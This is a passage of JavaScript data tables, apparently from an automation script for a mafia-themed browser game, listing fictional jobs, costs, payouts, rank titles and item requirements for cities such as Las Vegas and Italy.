    ['Silence A Shadow Kingdom Patrol'                   , 81,143,8,BANGKOK,133,0,'     ',,1], // CHAPTER 3
    ['Battle Your Way Through The Temple'                , 96,144,8,BANGKOK,159,0,'     ',,1], // FINALE
    ['Overthrow The Shadow King'                         ,  1,145,8,BANGKOK,  3,0,'     ',,0], // BOSS JOB
    // LAS VEGAS
    ['Move Your Crew Into A Safe House'                  ,  9,  1,1,LV    ,  7,0,'node1' ,,1],    // ENERGY DISTRICT 1  LAS VEGAS NORTH LAS VEGAS
    ['Blackmail A Car Dealer'                            ,  8,  2,1,LV    , 11,0,'node2' ,,1],    // ENERGY
    ['Steal A Truckload Of Slots'                        , 24,  3,1,LV    , 18,0,'node3' ,,1],    // ENERGY
    ['Secure Some Wheels'                                , 18,  4,1,LV    , 25,0,'node4' ,,1],    // ENERGY
    ['Roll a Bingo Parlor'                               ,  6,  5,1,LV    ,  9,1,'node5' ,,0],    // STAMINA
    ['Break Into A Gun Shop'                             , 12,  6,1,LV    , 16,0,'node6' ,,1],    // ENERGY
    ['Scout Out Alphabet City'                           , 15,  7,1,LV    , 20,0,'node7' ,,1],    // ENERGY
    ['Open Fire On Victor\'s Crew'                       , 23,  8,1,LV    , 27,0,'node8' ,,2],    // SOCIAL
//   ['Boss: Defeat Victor Lil\' Loco Alves'             ,  5,  9,1,LV    ,  6,0,'node9' ,,0],    //        BOSS JOB STAMINA
    ['Help A Bookie Out Of A Jam'                        , 15, 10,2,LV    ,  9,0,'node10',,1],    // ENERGY DISTRICT 2  LAS VEGAS PARADISE CITY
    ['Win An Underground Fight'                          , 11, 11,2,LV    , 18,1,'node11',,0],    // STAMINA
    ['Clip A Petty Thug'                                 , 10, 12,2,LV    , 16,1,'node12',,0],    // STAMINA
    ['Fix A Boxing Match'                                , 11, 13,2,LV    , 15,0,'node13',,1],    // ENERGY
    ['Clean Up At A Rigged Table'                        , 10, 14,2,LV    , 14,0,'node14',,1],    // ENERGY
    ['Recruit A Table Game Dealer'                       ,  9, 15,2,LV    , 12,0,'node15',,1],    // ENERGY (PROPERTY)
    ['Strong-Arm A Limo Company'                         , 14, 16,2,LV    , 18,0,'node16',,1],    // ENERGY
    ['Shut Down An Uncooperative Club'                   , 15, 17,2,LV    , 20,0,'node17',,1],    // ENERGY
    ['Hit Up A Nightclub'                                ,  7, 18,2,LV    ,  9,0,'node18',,1],    // ENERGY
//  ['Boss: Defeat Jimmy \'Big Time\' Mancuso'           ,  5, 19,2,LV    , 70,0,'node19',,0],    //        BOSS JOB STAMINA
    ['Open Fire On A Rival Outfit'                       , 14, 20,3,LV    , 23,1,'node20',,0],    // STAMINA  DISTRICT 3  LAS VEGAS THE LOWER STRIP
    ['Buy Some Black-Market Info'                        ,  9, 21,3,LV    , 15,0,'node21',,1],    // ENERGY
    ['Steal An SUV'                                      , 12, 22,3,LV    , 19,2,'node22',,2],    // SOCIAL
    ['Run A Visiting Gang Boss Out'                      , 17, 23,3,LV    , 28,1,'node23',,0],    // STAMINA
    ['Do Some Late Night Shopping'                       , 10, 24,3,LV    , 17,0,'node24',,1],    // ENERGY
    ['Rob A Gem Broker'                                  , 23, 25,3,LV    , 36,2,'node25',,2],    // SOCIAL
    ['Convince A Restaurateur To Leave Town'             , 17, 26,3,LV    , 24,0,'node26',,1],    // ENERGY (PROPERTY)
    ['Arrange A Hardware Delivery'                       , 15, 27,3,LV    , 23,0,'node27',,1],    // ENERGY
    ['Break Into A Luxury Suite'                         , 17, 28,3,LV    , 26,0,'node28',,1],    // ENERGY
//  ['Boss: Defeat Juliana \"Black Widow\" Trieste'      ,  6, 29,3,LV    ,200,0,'node29',,0],    //        BOSS JOB STAMINA
    ['Bribe A Casino Pit Boss'                           ,  5, 30,4,LV    ,  8,0,'node30',,1],    // ENERGY DISTRICT 4  LAS VEGAS SHOGUN CASINO
    ['Steal A Valet\'s Uniform'                          , 12, 31,4,LV    , 20,0,'node31',,1],    // ENERGY
    ['Swipe A Security Keycard'                          , 10, 32,4,LV    , 16,0,'node32',,1],    // ENERGY
    ['Take Out An Armed Casino Guard'                    , 13, 33,4,LV    , 21,1,'node33',,0],    // STAMINA
    ['Create A Distraction On The Floor'                 , 10, 34,4,LV    , 17,0,'node34',,1],    // ENERGY
    ['Hack The Casino Security System'                   , 12, 35,4,LV    , 21,0,'node35',,1],    // ENERGY
    ['Break Into The Vault'                              , 17, 36,4,LV    , 26,0,'node36',,1],    // ENERGY
    ['Get To An Exit'                                    , 22, 37,4,LV    , 35,0,'node37',,1],    // ENERGY
    ['Hijack A Poker Table Delivery'                     , 18, 38,4,LV    , 27,0,'node38',,1],    // ENERGY (PROPERTY)
//  ['Boss: Defeat Roger Bidwell\, Chief of Security'    ,  6, 39,4,LV    ,400,0,'node39',,0],    //        BOSS JOB STAMINA
    ['Move The Take Out Of Town'                         , 13, 40,5,LV    , 21,0,'node40',,1],    // ENERGY DISTRICT 5 LAS VEGAS MOJAVE DESERT
    ['Fight Off A Hijack Crew'                           , 14, 41,5,LV    , 23,1,'node41',,0],    // STAMINA
    ['Run A Highway Patrol Blockade'                     , 23, 42,5,LV    , 37,2,'node42',,2],    // SOCIAL
    ['Buy Off A Crooked Border Agent'                    , 15, 43,5,LV    , 24,0,'node43',,1],    // ENERGY
    ['Stash The Take'                                    , 20, 44,5,LV    , 33,2,'node44',,2],    // SOCIAL
    ['Arrange A Cartel Sale'                             ,  9, 45,5,LV    , 16,0,'node45',,1],    // ENERGY
    ['Clean Out A Biker Bar'                             , 11, 46,5,LV    , 19,1,'node46',,0],    // STAMINA
    ['Create A Diversion'                                , 11, 47,5,LV    , 18,0,'node47',,1],    // ENERGY
    ['Dispose Of The Evidence'                           , 14, 48,5,LV    , 23,0,'node48',,1],    // ENERGY
//  ['Boss: Defeat \'Red\' Jackson'                      ,  7, 49,5,LV    ,600,0,'node49',,0],    //        BOSS JOB STAMINA
    ['Rescue A Hotelier'                                 , 10, 50,5,LV    , 17,0,'node50',,1],    // ENERGY  (PROPERTY)
    ['Remove An Unhelpful Union Rep'                     , 15, 51,6,LV    , 26,1,'node51',,0],    // STAMINA
    ['Get A Council Member On Board'                     , 17, 52,6,LV    , 27,0,'node52',,1],    // ENERGY
    ['Buy Off A Precinct Captain'                        , 18, 53,6,LV    , 29,0,'node53',,1],    // ENERGY
    ['Eliminate A Hill Supplier'                         , 16, 54,6,LV    , 28,1,'node54',,0],    // STAMINA
    ['Convince A Judge To Step Down'                     , 14, 55,6,LV    , 29,0,'node55',,1],    // ENERGY
    ['Wipe Out The Hill Security Detail'                 , 18, 56,6,LV    , 32,1,'node56',,0],    // STAMINA
    ['Remove The Hill\'s Support Base'                   , 17, 57,6,LV    , 27,2,'node57',,2],    // SOCIAL
    ['Reveal A Politician\'s Dirty Secret'               , 19, 58,6,LV    , 30,0,'node58',,1],    // ENERGY
    ['Infiltrate The Hill Resort'                        , 16, 59,6,LV    , 25,0,'node59',,1],    // ENERGY
//  ['Boss: Defeat Leon and Marcus Hill'                 ,  7, 60,6,LV    ,900,0,'node60',,0],    //        BOSS JOB STAMINA
    ['Breach the Area 51 Perimeter'                      , 15, 61,7,LV    , 25,0,'node61',,1],    // ENERGY
    ['Neutralize a Security Patrol'                      , 14, 62,7,LV    , 24,1,'node62',,0],    // STAMINA
    ['Disable a Surveillance Station'                    , 21, 63,7,LV    , 33,0,'node63',,2],    // SOCIAL
    ['Infiltrate A Top Secret Bunker'                    , 18, 64,7,LV    , 32,0,'node64',,1],    // ENERGY
    ['Attack A Guard Post'                               , 16, 65,7,LV    , 27,1,'node65',,0],    // STAMINA
    ['Find A Route Through The Ducts'                    , 23, 66,7,LV    , 36,0,'node66',,2],    // SOCIAL
    ['Take Out A Black Ops Team'                         , 18, 67,7,LV    , 32,1,'node67',,0],    // STAMINA
    ['Nab A High Tech Prototype'                         , 19, 68,7,LV    , 33,0,'node68',,1],    // ENERGY
    ['Hack The Research Lab Door'                        , 18, 69,7,LV    , 29,0,'node69',,1],    // ENERGY
//  ['Boss: Defeat Dr. Hank Williams'                    ,  8, 70,7,LV    ,120,0,'node70',,0],    //           BOSS JOB STAMINA
    ['Uncover Rumors About Governor Halloran'            , 17, 71,8,LV    , 28,0,'node71',,1],    // ENERGY
    ['Question Some Meth Heads'                          , 15, 72,8,LV    , 26,1,'node72',,0],    // STAMINA
    ['Dig Up Links To Halloran And A Meth Ring'          , 20, 73,8,LV    , 35,0,'node73',,1],    // ENERGY
    ['Discover A Big Meth Buy At The Hoover Dam'         , 24, 74,8,LV    , 37,0,'node74',,2],    // SOCIAL
    ['Get Your Spotters In Place Above The Dam'          , 22, 75,8,LV    , 38,0,'node75',,1],    // ENERGY
    ['Take Out A Crooked DEA Unit'                       , 17, 76,8,LV    , 29,1,'node76',,0],    // STAMINA
    ['Verify Halloran\'s Arrival At The Dam'             , 19, 77,8,LV    , 34,0,'node77',,1],    // ENERGY
    ['Take Down The Security Detail'                     , 20, 78,8,LV    , 35,1,'node78',,0],    // STAMINA
//  ['Boss: Defeat Governor Halloran'                    ,  8, 79,8,LV    ,120,0,'node79',,0],     //           BOSS JOB STAMINA
    //ITALY
    ['Connect With La Familia'                           ,  4,  1,1,ITALY ,  4,0,'node1' ,,1],    // ENERGY
    ['Recruit Some Local Muscle'                         ,  7,  2,1,ITALY ,  8,0,'node2' ,,1],    // ENERGY
    ['Set Up The Italian Operation'                      , 10,  3,1,ITALY , 14,0,'node3' ,,1],    // ENERGY
    ['Take Over The Italian Operation'                   ,  8,  4,1,ITALY , 14,1,'node4' ,,0],    // STAMINA
    ['Intercept A Handoff In The Coliseum'               , 14,  5,1,ITALY , 23,0,'node5' ,,1],    // ENERGY
    ['Assassinate A Corrupt City Official'               , 12,  6,1,ITALY , 18,1,'node6' ,,0],    // STAMINA
    ['Discover The Conspiracy'                           , 18,  7,1,ITALY , 27,0,'node7' ,,1],    // ENERGY
    ['Defeat The Di Rossi Hired Muscle'                  , 12,  8,1,ITALY , 18,1,'node8' ,,0],    // STAMINA
    ['Send A Message To The Di Rossi Family'             , 18,  9,1,ITALY , 27,0,'node9' ,,1],    // ENERGY
//  ['Boss: Confront Don Antonio Di Rossi'              ,  1, 10,1,ITALY ,  2,0,'node10',,0],    //        BOSS JOB STAMINA
    ['Find An Old Family Friend'                         , 25, 11,2,ITALY , 41,0,'node11',,1],    // ENERGY
    ['Build The Winery'                                  , 14, 12,2,ITALY , 23,0,'node12',,1],    // ENERGY
    ['Battle For Water Rights'                           , 20, 13,2,ITALY , 31,1,'node13',,0],    // STAMINA
    ['Sabotage A Rival'                                  , 18, 14,2,ITALY , 27,0,'node14',,1],    // ENERGY
    ['Survive Adriano\'s Betrayal'                       , 32, 15,2,ITALY , 50,0,'node15',,2],    // SOCIAL
    ['Repel Adriano\'s Assassins'                        , 24, 16,2,ITALY , 41,1,'node16',,0],    // STAMINA
    ['Hide Your Family'                                  , 28, 17,2,ITALY , 46,0,'node17',,1],    // ENERGY
    ['Flee To Safety'                                    , 36, 18,2,ITALY , 55,0,'node18',,2],    // SOCIAL
    ['Swear An Oath Of Vengeance'                        , 28, 19,2,ITALY , 46,0,'node19',,1],    // ENERGY
    ['Track Down Don Adriano'                            , 32, 20,2,ITALY , 50,0,'node20',,1],    // ENERGY
//  [Boss: Don Aldo Adriano                              ,  1, 21,2,ITALY ,  2,0,'node21',,0],    //        BOSS JOB STAMINA
    ['Bug The Don\'s Train Car'                          , 36, 22,3,ITALY , 60,0,'node22',,1],    // ENERGY
    ['Collect Info From A Gondolier'                     , 39, 23,3,ITALY , 64,0,'node23',,1],    // ENERGY
    ['Smuggle Goods Through A Fishery'                   , 32, 24,3,ITALY , 50,0,'node24',,1],    // ENERGY
    ['Rough Up a Local Scalper'                          , 24, 25,3,ITALY , 41,1,'node25',,0],    // STAMINA
    ['Counterfeit Tickets For The Masque Ball'           , 32, 26,3,ITALY , 55,0,'node26',,1],    // ENERGY
    ['Recruit Gang Of Street Rats'                       , 36, 27,3,ITALY , 60,2,'node27',,2],    // SOCIAL
    ['Rob A Costume Shop'                                , 28, 28,3,ITALY , 46,1,'node28',,0],    // STAMINA
    ['Buy Out A Costume Shop'                            , 28, 29,3,ITALY , 46,0,'node29',,1],    // ENERGY
    ['Lift A Performer\'s Outfit'                        , 36, 30,3,ITALY , 60,2,'node30',,1],    // SOCIAL
    ['Deal With The Don\'s Guards'                       , 32, 31,3,ITALY , 55,1,'node31',,0],    // STAMINA
    ['Distract The Don\'s Guards'                        , 39, 32,3,ITALY , 64,0,'node32',,1],    // ENERGY
    ['Lure The Don To A Secluded Location'               , 46, 33,3,ITALY , 78,0,'node33',,1],    // ENERGY
//  ['Boss: Don Del Brenta'                              ,  1, 34,3,ITALY ,  2,0,'node34',,0],    //        BOSS JOB STAMINA
    ['Free A Professional Assassin'                      , 46, 35,4,ITALY , 78,0,'node35',,1],    // ENERGY
    ['Bug A Confessional'                                , 43, 36,4,ITALY , 73,0,'node36',,1],    // ENERGY
    ['Infiltrate A Seven Star Hotel'                     , 36, 37,4,ITALY , 60,1,'node37',,0],    // STAMINA
    ['Blackmail A Track Official'                        , 54, 38,4,ITALY , 92,0,'node38',,1],    // ENERGY
    ['Interrogate A Lackey'                              , 28, 39,4,ITALY , 50,1,'node39',,0],    // STAMINA
    ['Rob A Collector'                                   , 50, 40,4,ITALY , 83,0,'node40',,1],    // ENERGY
    ['Pressure The Bookies'                              , 57, 41,4,ITALY , 96,0,'node41',,1],    // ENERGY
    ['Assassinate The Volovino Bodyguard'                , 36, 42,4,ITALY , 64,1,'node42',,0],    // STAMINA
    ['Rig The Big Race'                                  , 50, 43,4,ITALY , 83,0,'node43',,1],    // ENERGY
//  ['Boss: Volovino Twins'                              ,  1, 44,4,ITALY , 2 ,0,'node44',,0],    //        BOSS JOB STAMINA
    ['Snag A Lucrative Disposal Contract'                , 54, 45,5,ITALY , 92,0,'node45',,1],    // ENERGY
    ['Take On A Camorra Trash Crew'                      , 44, 46,5,ITALY , 78,1,'node46',,0],    // STAMINA
    ['\'Lose\' A Waste Cargo At Sea'                     , 72, 47,5,ITALY ,119,2,'node47',,2],    // SOCIAL
    ['Show A Business Owner Who\'s In Charge'            , 61, 48,5,ITALY ,106,0,'node48',,1],    // ENERGY
    ['Take Out A Troublesome Carabinieri'                , 48, 49,5,ITALY , 88,1,'node49',,0],    // STAMINA
    ['Link The Camorra To The Police'                    , 64, 50,5,ITALY ,111,2,'node50',,1],    // SOCIAL
    ['Break Out An Incarcerated Lieutenant'              , 57, 51,5,ITALY , 96,0,'node51',,1],    // ENERGY
    ['Support Your Local Hooligan Firm'                  , 40, 52,5,ITALY , 73,1,'node52',,0],    // STAMINA
    ['Blow Up A Police Station'                          , 72, 53,5,ITALY ,124,0,'node53',,1],    // ENERGY

    ['Trash A Rival Camorra Stadium'                     , 75, 54,5,ITALY ,124,0,'node54',,1],     // ENERGY (PROPERTY)
//  ['Boss: Defeat Don Enzo Casazza'                     ,  1, 55,5,ITALY,   2,0,'node55',,0]     //        BOSS JOB STAMINA
// r6
    ['Deal with the Dock Union'                          , 57, 56,6,ITALY , 92,0,'node56',,1],    // ENERGY
    ['Replace the Dock Workers'                          , 72, 57,6,ITALY ,115,0,'node57',,1],    // ENERGY
    ['Smuggle out the Contraband'                        , 79, 58,6,ITALY ,129,0,'node58',,1],    // ENERGY
    ['Terrorize the Dock Workers'                        , 64, 59,6,ITALY ,115,1,'node59',,0],    // STAMINA
    ['Destroy the Lighthouse'                            , 96, 60,6,ITALY ,170,1,'node60',,0],    // STAMINA
    ['Sabotage the Messino Ships'                        , 80, 61,6,ITALY ,143,1,'node61',,0],    // STAMINA
    ['Rig the Vote for the Local Governor'               ,100, 62,6,ITALY ,157,0,'node62',,1],    // ENERGY
    ['Expose the corruption of the Messino Family'       , 86, 63,6,ITALY ,143,0,'node63',,1],    // ENERGY
    ['Set Up Your Nightclub'                             , 90, 64,6,ITALY ,152,0,'node64',,1],    // ENERGY
    ['Attack the Messino Compound'                       , 96, 65,6,ITALY ,161,1,'node65',,0],    // STAMINA
//  ['Boss: Don Vittorio Messino'                        ,  1, 66,6,ITALY ,  2,0,'node66',,0],    //           Boss Job

// r7          0                                            1  2  3   4     5  6     7   8 9
    ['Blow A Hole In The Vatican Wall'                   , 75, 67,7,ITALY ,124,1,'node67',,1],    // STAMINA path energy job
    ['Scale The Vatican Wall'                            , 82, 68,7,ITALY ,134,0,'node68',,1],    // ENERGY
    ['Procure A Roman Sewer Map'                         , 72, 69,7,ITALY ,119,2,'node69',,2],    // Social
    ['Take Out A Responding Police Unit'                 ,100, 70,7,ITALY ,176,1,'node70',,0],    // STAMINA
    ['Disable The Surveillance System'                   , 86, 71,7,ITALY ,143,0,'node71',,1],    // ENERGY
    ['Find An Entrance In The Catacombs'                 ,115, 72,7,ITALY ,180,1,'node72',,2],    // Social
    ['Infiltrate The Basilica'                           ,108, 73,7,ITALY ,170,0,'node73',,1],    // ENERGY
    ['Disable A Vatican Guard'                           , 88, 74,7,ITALY ,157,1,'node74',,0],    // STAMINA
    ['Locate The Secret Archive Vault'                   ,111, 75,7,ITALY ,199,0,'node75',,1],    // ENERGY
//boss
//  ['Defeat Comandante Ebersold'                        ,  1, 76,7,ITALY ,  2,0,'node76',,0],    //           Boss Job

// r8          0                                            1  2  3   4     5  6     7   8 9
    ['Infiltrate Rafaele Di Rossi\'s Spy Network'        ,115, 77,8,ITALY ,180,2,'node77',,2],    // social
    ['Set A Trap For Di Rossi\'s Top Capo'               ,100, 78,8,ITALY ,166,0,'node78',,1],    // energy
    ['Shoot Up The Don\'s Country Estate'                ,104, 79,8,ITALY ,184,1,'node79',,0],    // STAMINA
    ['Meet A Traitor'                                    ,111, 80,8,ITALY ,176,0,'node80',,1],    // ENERGY
    ['Gain Access To Private Villa'                      ,108, 81,8,ITALY ,170,0,'node81',,1],    // ENERGY
    ['Escape From Rome Police'                           ,124, 82,8,ITALY ,222,1,'node82',,0],    // STAMINA
    ['Tip Off The Rome Police'                           ,158, 83,8,ITALY ,249,0,'node83',,2],    // SOCIAL
    ['Smuggle in Explosives'                             ,126, 84,8,ITALY ,203,0,'node84',,1],    // ENERGY
    ['Demolish Di Rossi\'s Villa'                        ,140, 85,8,ITALY ,231,0,'node85',,1]     // ENERGY
//boss
//  ['Boss: Don Raffaele Di Rossi'                       ,  1, 86,8,ITALY ,  2,0,'node86',,0],    //           Boss Job
// job description0, energy cost1, job number2, tab number3, city4, exp payout5, tabpath6, lvnode7, ratio8, EOL Job9
///////////////////////////////////////////////////////////////////////////////////////////
  );

  var missionTabs = new Array(
    // NEW YORK
    ['Street Thug (Levels 1-4)','Associate (Levels 5-8)','Soldier (Levels 9-12)',
     'Enforcer (Levels 13-17)','Hitman (Levels 18-24)', 'Capo (Levels 25-34)',
     'Consigliere (Levels 35-59)','Underboss (Levels 60-99)','Boss (Levels 100+)'],
    // CUBA
    ['El Soldado (Levels 35-59)','El Capitan (Levels 60-84)','El Jefe (Levels 85-109)',
     'El Patron (Levels 110-129)','El Padrino (Levels 130-150)','El Cacique (Levels 151+)'],
    // MOSCOW
    ['Baklany','Boets','Brigadir','Avtoritet','Vor','Pakhan'],
    // BANGKOK
    ['Brawler','Criminal','Pirate','Commandant','Oyabun','Dragon Head','Saboteur','Assassin'],
    // LAS VEGAS ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    ['North Las Vegas','Paradise City','The Lower Strip','Shogun Casino','Mojave Desert','The Upper Strip','Area 51','Hoover Dam'],
    // ITALY /////////////////////////////////////
    ['Roma','Palermo','Venezia','Milano','Napoli','Calabria','Citta Del Vaticano','The Eternal City']
  );

  var mwTitles = new Array(
    'Street Thug', 'Skilled Street Thug', 'Master Street Thug', 'Associate', 'Skilled Associate', 'Master Associate', 'Soldier', 'Skilled Soldier', 'Master Soldier',
    'Enforcer', 'Skilled Enforcer', 'Master Enforcer', 'Hitman', 'Skilled Hitman', 'Master Hitman', 'Capo', 'Skilled Capo', 'Master Capo',
    'Consigliere', 'Skilled Consigliere', 'Master Consigliere', 'Underboss', 'Skilled Underboss', 'Master Underboss', 'Boss', 'Skilled Boss', 'Master Boss',
    'El Soldado', 'El Soldado Experto', 'El Soldado Principal', 'El Capitan', 'El Capitan Experto', 'El Capitan Principal', 'El Jefe', 'El Jefe Experto', 'El Jefe Principal',
    'El Patron', 'El Patron Experto', 'El Patron Principal', 'El Padrino', 'El Padrino Experto', 'El Padrino Principal', 'El Cacique', 'El Cacique Experto', 'El Cacique Principal',
    'Baklan', 'Umelyj Baklan', 'Matyoryj Baklan', 'Boets', 'Umelyj Boets', 'Matyoryj Boets', 'Brigadir', 'Umelyj Brigadir', 'Matyoryj Brigadir',
    'Avtoritet', 'Umelyj Avtoritet', 'Matyoryj Avtoritet', 'Vor', 'Umelyj Vor', 'Matyoryj Vor', 'Pakhan', 'Umelyj Pakhan', 'Matyoryj Pakhan',
    'Brawler', 'Apprentice Brawler', 'Skilled Brawler', 'Master Brawler', 'Criminal', 'Apprentice Criminal', 'Skilled Criminal', 'Master Criminal',
    'Pirate', 'Apprentice Pirate', 'Skilled Pirate', 'Master Pirate', 'Commandant', 'Apprentice Commandant', 'Skilled Commandant', 'Master Commandant',
    'Oyabun', 'Apprentice Oyabun', 'Skilled Oyabun', 'Master Oyabun', 'Dragon Head', 'Apprentice Dragon Head', 'Skilled Dragon Head', 'Master Dragon Head',
    'Burglar','Apprentice Burglar', 'Skilled Burglar', 'Master Burglar', 'Saboteur', 'Apprentice Saboteur', 'Skilled Saboteur', 'Master Saboteur',
    'Touristy Bandito', 'Local Bandito', 'Professional Bandito', 'Big Time Bandito', 'Touristy Hustler', 'Local Hustler', 'Professional Hustler', 'Big Time Hustler',
    'Touristy Cowboy', 'Local Cowboy', 'Professional Cowboy', 'Big Time Cowboy', 'Touristy Maverick', 'Local Maverick', 'Professional Maverick', 'Big Time Maverick',
    'Touristy Desert Rat', 'Local Desert Rat', 'Professional Desert Rat', 'Big Time Desert Rat',
    'Apprentice Bully', 'Skilled Bully', 'Master Bully','Apprentice Brute', 'Skilled Brute', 'Master Brute','Apprentice Hunter', 'Skilled Hunter', 'Master Hunter',
    'Apprentice Slayer', 'Skilled Slayer', 'Master Slayer','Apprentice Killer', 'Skilled Killer', 'Master Killer','Apprentice Executioner', 'Skilled Executioner', 'Master Executioner',
    'Apprentice Assassin', 'Skilled Assassin', 'Master Assassin',
    'Apprentice Burglar', 'Burglar', 'Master Burglar', 'Apprentice Robber', 'Robber', 'Master Robber', 'Apprentice Thief', 'Thief', 'Master Thief', 'Grand Master Thief',
    'Trainee', 'Sparring Partner', 'Novice', 'Journeyman', 'Fighter', 'Boxer', 'Contender', 'Finalist', 'Champion', 'World Champion'
  );

  const CHOICE_JOBNO   = 0;
  const CHOICE_JOBNAME = 1;
  const CHOICE_CITY    = 2;

  var choiceJobs = new Array (
    // Job no and Job names array must correspond with each city's CITY_SIDES array
    // MOSCOW
    [[4,7], ['Kidnap A Local Gang Leader for the Vory', 'Kill A Local Gang Leader for the Mafiya'], MOSCOW],
    [[5, 8], ['Collect The Ransom', 'Collect the Hit Payoff'], MOSCOW],
    [[6, 9], ['Receive Vory Intel On Dmitri', 'Buy Mafiya Intel On Dmitri'], MOSCOW],
    [[17, 20], ['Fix A Local Election for the Vory', 'Abduct A Candidate\'s Wife For the Mafiya'], MOSCOW],
    [[18, 21], ['Extract A Favor From The Winner', '"Convince" The Candidate To Withdraw'], MOSCOW],
    [[19, 22], ['Catch Karpov Accepting A Bribe', 'Kill An Investigative Reporter'], MOSCOW],
    [[34, 37], ['Take A Guard Hostage During Your Escape', 'Execute A Bank Guard During Your Escape'], MOSCOW],
    [[35, 38], ['Use The Guard\'s Keys To Access the Bank Armory', 'Steal The Bank President\'s Car Keys'], MOSCOW],
    [[36, 39], ['"Borrow" The Guard\'s Uniform After Releasing Him', 'Strip A Uniform Off The Corpse'], MOSCOW],
    [[47, 50], ['Fly To The Siberian Military District', 'Travel To The Volga Military District'], MOSCOW],
 //FIXME - Can the jobs be entered in the array as with 3 options, In case the job name change hasn't rolled out to all servers?
 //OLD   [[48, 51], ['Rob A Troop Convoy', 'Arrange The Sale Of Weapons-Grade Explosives'], MOSCOW],
 //NEW   [[48, 51], ['Rob A Troop Convoy', 'Arrange The Sale Of Weapons-Grade Uranium'], MOSCOW],
    [[48, 51], ['Rob A Troop Convoy', 'Arrange The Sale Of Weapons-Grade Uranium', 'Arrange The Sale Of Weapons-Grade Explosives'], MOSCOW],
    [[49, 52], ['Intercept The Base\'s Pay Shipment', 'Capitalize On An Officer\'s Gambling Problem'], MOSCOW],
    [[64, 67], ['Infiltrate The ULF Cell', 'Discover The Location Of The Next ULF Attack'], MOSCOW],
    [[65, 68], ['Help "Plan" The Next Attack', 'Kill A Lookout'], MOSCOW],
    [[66, 69], ['Sabotage The Plan From The Inside', 'Stop The ULF Attack'], MOSCOW],
    [[77, 80], ['Attack A Mafiya Business', 'Burn Down A Vory Safehouse'], MOSCOW],
    [[78, 81], ['Hijack A Mafiya Cargo', 'Hit A Vory Nightclub'], MOSCOW],
    [[79, 82], ['Threaten A Mafiya Moneyman\'s Family', 'Break Into An Architect\'s Office'], MOSCOW],
    // BANGKOK
    [[5, 8], ['Meet A Gang\'s Rep In A Go-Go Bar', 'Meet A Gang\'s Rep In A Go-Go Bar'], BANGKOK],
    [[11, 14], ['Intercept An Ammo Shipment', 'Intercept An Ammo Shipment'], BANGKOK],
    [[24, 27], ['Set Up A Phony Business', 'Set Up A Phony Business'], BANGKOK],
    [[30, 33], ['Pay Off The Guards At Bangkwang Prison', 'Pay Off The Guards At Bangkwang Prison'], BANGKOK],
    [[43, 46], ['Hijack A Boat Load Of Electronics', 'Hijack A Boat Load Of Electronics'], BANGKOK],
    [[49, 52], ['Steal Shipping Manifests', 'Steal Shipping Manifests'], BANGKOK],
    [[62, 65], ['Establish Contact With A CIA Agent', 'Establish Contact With A CIA Agent'], BANGKOK],
    [[68, 71], ['Betray Commander Chang and the UWSA', 'Betray Commander Chang and the UWSA'], BANGKOK],
    [[81, 84], ['Meet With Boss Matsumura\'s Advisor', 'Meet With Boss Matsumura\'s Advisor'], BANGKOK],
    [[87, 90], ['Talk With A Police Insider About Matsumura', 'Talk With A Police Insider About Matsumura'], BANGKOK],
    [[100, 103], ['Intimidate Wealthy Expatriates', 'Intimidate Wealthy Foreign Expatriates'], BANGKOK],
    [[106, 109], ['Talk With Wei\'s Disloyal Enforcers', 'Talk With Wei\'s Disloyal Enforcers'], BANGKOK],
    [[119, 122], ['Get A Gang Member Back Into Thailand', 'Get A Gang Member Back Into Thailand'], BANGKOK],
    [[125, 128], ['Undermine Nongchai\'s Support', 'Undermine Nongchai\'s Support'], BANGKOK]
  );

  var requirementJob = new Array(
    // Item, Job, City
    ['Liquor', 'Distill Some Liquor',NY],
    ['Tokens', 'Manufacture Tokens',NY],
    ['Wiretap Device', 'Overtake Phone Central',NY],
    ['1 Wiretap Device', 'Overtake Phone Central',NY],
    ['Cards', 'Get Cheating Deck',NY],
    ['Untraceable Cell Phone', 'Rob an Electronics Store',NY],
    ['Concealable Camera', 'Rob an Electronics Store',NY],
    ['Computer Set-Up', 'Rob an Electronics Store',NY],
    ['Blackmail Photos', 'Obtain Compromising Photos',NY],
    ['Illegal Transaction Records', 'Steal Bank Records',NY],
    ['.22 Pistol', 'Beat Up Rival Gangster',NY],
    ['Revolver', 'Beat Up Rival Gangster',NY],
    ['9mm Semi-Automatic', 'Rob a Pimp',NY],
    ['Butterfly Knife', 'Collect Protection Money',NY],
    ['Brass Knuckles', 'Rough Up Dealers',NY],
    ['Tactical Shotgun', 'Perform a Hit',NY],
    ['.45 Revolver', 'Take Out a Rogue Cop',NY],
    ['C4', 'Destroy Enemy Mob Hideout',NY],
    ['Stab-Proof Vest', 'Kill a Protected Snitch',NY],
    ['Automatic Rifle', 'Bust a Made Man Out of Prison',NY],
    ['Lucky Shamrock Medallion', 'Clip the Irish Mob\'s Local Enforcer',NY],
    ['Semi-Automatic Shotgun', 'Fight a Haitian Gang',NY],
    ['Firebomb', 'Steal a Tanker Truck',NY],
    ['Armored Truck', 'Smuggle Thai Gems',NY],
    ['Grenade Launcher', 'Repel the Yakuza',NY],
    ['.50 Caliber Rifle', 'Disrupt Rival Smuggling Ring',NY],
    ['Armored Car', 'Invade Tong-controlled Neighborhood',NY],
    ['RPG Launcher', 'Sell Guns to the Russian Mob',NY],
    ['Bodyguards', 'Protect your City against a Rival Family',NY],
    ['Night Vision Goggles', 'Assassinate a Political Figure',NY],
    ['Napalm', 'Exterminate a Rival Family',NY],
    ['Prop plane', 'Steal an Air Freight Delivery',NY],
    ['Chopper', 'Run a Biker Gang Out of Town',NY],
    ['Luxury Yacht', 'Influence a Harbor Official',NY],
    ['GX9', 'Ransom a Businessman\'s Kids',NY],
    ['Bookie\'s Holdout Pistol', 'Fix the Big Game',NY],
    ['Multi-Purpose Truck', 'Break Into the Armory',NY],
    ['BA-12 Assault Rifle', 'Rip Off the Armenian Mob',NY],
    ['Falsified Documents', 'Take Over an Identity Theft Ring',NY],
    ['Federal Agent', 'Buy Off a Federal Agent',NY],
    ['Private Jet', 'Make a Deal with the Mexican Cartel',NY],
    ['Police Cruiser', 'Blackmail the District Attorney',NY],
    ['Armoured Limousine', 'Shake Down a City Council Member',NY],
    ['Cigarette Boat', 'Take Over The Docks',CUBA],
    ['TNT', 'Raid The Arms Depot',CUBA],
    ['Si-14 Cargo Plane', 'Capture The Airport',CUBA],
    ['Armored State Car', 'Storm The Presidential Palace',CUBA],
    ['Untraceable Cell Phone', 'Arrange A Drug Shipment for the Mafiya',MOSCOW],
